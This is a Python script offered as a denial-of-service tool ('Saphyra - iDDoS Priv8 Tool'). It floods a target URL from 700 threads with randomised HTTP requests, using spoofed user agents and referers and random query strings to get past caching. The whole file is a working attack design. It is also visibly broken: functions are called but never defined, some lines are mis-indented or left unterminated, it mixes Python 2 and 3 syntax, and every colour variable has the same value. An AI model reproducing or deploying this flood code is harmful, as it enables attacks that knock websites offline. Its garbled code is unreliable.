# Saphyra - iDDoS Priv8 Tool

import urllib2
import sys
import threading
import random
import re
import os
import colorama
# Colors
yellow='\033[92m'
cyan='\033[92m'
pink='\033[92m'
green = '\033[92m'
red ='\033[92m'
white ='\033[92m'
black ='\033[92m'
# Requests
#global params
url=''
host=''
headers_useragents=[]
headers_referers=[]
request_counter=0
flag=0
safe=0

def inc_counter():
	global request_counter
	request_counter+=9999

def set_flag(val):
	global flag
	flag=val

def set_safe():
	global safe
	safe=1	
# generates a user agent array
def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..')
	headers_referers.append('http://vk.com/profile.php?redirect=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=query?=query=..')
	headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882')
	headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925')
	headers_referers.append('http://yandex.ru/yandsearch?text=')
	headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832')
	headers_referers.append('http://go.mail.ru/search?mail.ru=1&q=')
	headers_referers.append('http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..')
	headers_referers.append('http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..')
	headers_referers.append('http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..')
	headers_referers.append('http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..')
	headers_referers.append('http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..')
	headers_referers.append('http://www.google.ru/url?sa=t&rct=?j&q=&e..')
	headers_referers.append('http://help.baidu.com/searchResult?keywords=')
	headers_referers.append('http://www.bing.com/search?q=')
	headers_referers.append('https://www.yandex.com/yandsearch?text=')
	headers_referers.append('https://duckduckgo.com/?q=')
	headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('http://search.aol.com/aol/search?q=')
	headers_referers.append('https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=')
	headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
	headers_referers.append('http://validator.w3.org/feed/check.cgi?url=')
	headers_referers.append('http://host-tracker.com/check_page/?furl=')
	headers_referers.append('http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=')
	headers_referers.append('http://jigsaw.w3.org/css-validator/validator?uri=')
	headers_referers.append('https://add.my.yahoo.com/rss?url=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('https://steamcommunity.com/market/search?q=')
	headers_referers.append('http://filehippo.com/search?q=')
	headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
	headers_referers.append('http://eu.battle.net/wow/en/search?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://careers.gatesfoundation.org/search?q=')
	headers_referers.append('http://techtv.mit.edu/search?q=')
	headers_referers.append('http://www.ustream.tv/search?q=')
	headers_referers.append('http://www.ted.com/search?q=')
	headers_referers.append('http://funnymama.com/search?q=')
	headers_referers.append('http://itch.io/search?q=')
	headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
	headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
	headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
	headers_referers.append('https://play.google.com/store/search?q=')
	headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
	headers_referers.append('http://www.reddit.com/search?q=')
	headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
	headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
	headers_referers.append('http://jobs.leidos.com/search?q=')
	headers_referers.append('http://jobs.bloomberg.com/search?q=')
	headers_referers.append('https://www.pinterest.com/search/?q=')
	headers_referers.append('http://millercenter.org/search?q=')
	headers_referers.append('https://www.npmjs.com/search?q=')
	headers_referers.append('http://www.evidence.nhs.uk/search?q=')
	headers_referers.append('http://www.shodanhq.com/search?q=')
	headers_referers.append('http://ytmnd.com/search?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('https://steamcommunity.com/market/search?q=')
	headers_referers.append('http://filehippo.com/search?q=')
	headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
	headers_referers.append('http://eu.battle.net/wow/en/search?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://careers.gatesfoundation.org/search?q=')
	headers_referers.append('http://techtv.mit.edu/search?q=')
	headers_referers.append('http://www.ustream.tv/search?q=')
	headers_referers.append('http://www.ted.com/search?q=')
	headers_referers.append('http://funnymama.com/search?q=')
	headers_referers.append('http://itch.io/search?q=')
	headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
	headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
	headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
	headers_referers.append('https://play.google.com/store/search?q=')
	headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
	headers_referers.append('http://www.reddit.com/search?q=')
	headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
	headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
	headers_referers.append('http://jobs.leidos.com/search?q=')
	headers_referers.append('http://jobs.bloomberg.com/search?q=')
	headers_referers.append('https://www.pinterest.com/search/?q=')
	headers_referers.append('http://millercenter.org/search?q=')
	headers_referers.append('https://www.npmjs.com/search?q=')
	headers_referers.append('http://www.evidence.nhs.uk/search?q=')
	headers_referers.append('http://www.shodanhq.com/search?q=')
	headers_referers.append('http://ytmnd.com/search?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('https://steamcommunity.com/market/search?q=')
	headers_referers.append('http://filehippo.com/search?q=')
	headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
	headers_referers.append('http://eu.battle.net/wow/en/search?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://careers.gatesfoundation.org/search?q=')
	headers_referers.append('http://techtv.mit.edu/search?q=')
	headers_referers.append('http://www.ustream.tv/search?q=')
	headers_referers.append('http://www.ted.com/search?q=')
	headers_referers.append('http://funnymama.com/search?q=')
	headers_referers.append('http://itch.io/search?q=')
	headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
	headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
	headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
	headers_referers.append('https://play.google.com/store/search?q=')
	headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
	headers_referers.append('http://www.reddit.com/search?q=')
	headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
	headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
	headers_referers.append('http://jobs.leidos.com/search?q=')
	headers_referers.append('http://jobs.bloomberg.com/search?q=')
	headers_referers.append('https://www.pinterest.com/search/?q=')
	headers_referers.append('http://millercenter.org/search?q=')
	headers_referers.append('https://www.npmjs.com/search?q=')
	headers_referers.append('http://www.evidence.nhs.uk/search?q=')
	headers_referers.append('http://www.shodanhq.com/search?q=')
	headers_referers.append('http://ytmnd.com/search?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('https://steamcommunity.com/market/search?q=')
	headers_referers.append('http://filehippo.com/search?q=')
	headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
	headers_referers.append('http://eu.battle.net/wow/en/search?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://careers.gatesfoundation.org/search?q=')
	headers_referers.append('http://techtv.mit.edu/search?q=')
	headers_referers.append('http://www.ustream.tv/search?q=')
	headers_referers.append('http://www.ted.com/search?q=')
	headers_referers.append('http://funnymama.com/search?q=')
	headers_referers.append('http://itch.io/search?q=')
	headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
	headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
	headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
	headers_referers.append('https://play.google.com/store/search?q=')
	headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
	headers_referers.append('http://www.reddit.com/search?q=')
	headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
	headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
	headers_referers.append('http://jobs.leidos.com/search?q=')
	headers_referers.append('http://jobs.bloomberg.com/search?q=')
	headers_referers.append('https://www.pinterest.com/search/?q=')
	headers_referers.append('http://millercenter.org/search?q=')
	headers_referers.append('https://www.npmjs.com/search?q=')
	headers_referers.append('http://www.evidence.nhs.uk/search?q=')
	headers_referers.append('http://www.shodanhq.com/search?q=')
	headers_referers.append('http://ytmnd.com/search?q=')
	headers_referers.append('https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=')
	headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
	headers_referers.append('http://www.google.com/translate?u=')
	headers_referers.append('https://developers.google.com/speed/pagespeed/insights/?url=')
	headers_referers.append('http://help.baidu.com/searchResult?keywords=')
	headers_referers.append('http://www.bing.com/search?q=')
	headers_referers.append('https://add.my.yahoo.com/rss?url=')
	headers_referers.append('https://play.google.com/store/search?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://' + host + '/')
	return(headers_referers)
#builds random ascii string
def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 160)
		out_str += chr(a)
	return(out_str)

os.system("clear")
print(green + f"З А Г Р У З К А....")
time.sleep(1.5)
os.system("clear")

	print('~>Saphyra DDoS Tool<~ )
	      
#http request
def httpcall(url):
	useragent_list()
	referer_list()
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(50,100)))
	request.add_header('Keep-Alive', random.randint(110,160))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print( "----->>> Attack started Sended <<<-----")
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

	
#http caller thread 
class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:
				code=httpcall(url)
				if (code==500) & (safe==1):
					set_flag(2)
		except Exception, ex:
			pass

# monitors http threads and counts requests
class MonitorThread(threading.Thread):
	def run(self):
		previous=request_counter
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				previous=request_counter
		if flag==2:
			print("\n-- Sending mass amounf --")

#execute 
if len(sys.argv) < 2:
	usage()
	sys.exit()
else:
	if sys.argv[1]=="help":
		usage()
		sys.exit()
	else:
		print("Starting the DDoS Tool")
		print("Created By Hax Stroke")
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
		if url.count("/")==2:
			url = url + "/"
		m = re.search('http\://([^/]*)/?.*', url)
		host = m.group(1)
		for i in range(700):
			t = HTTPThread()
			t.start()
		t = MonitorThread()
		t.start()

	
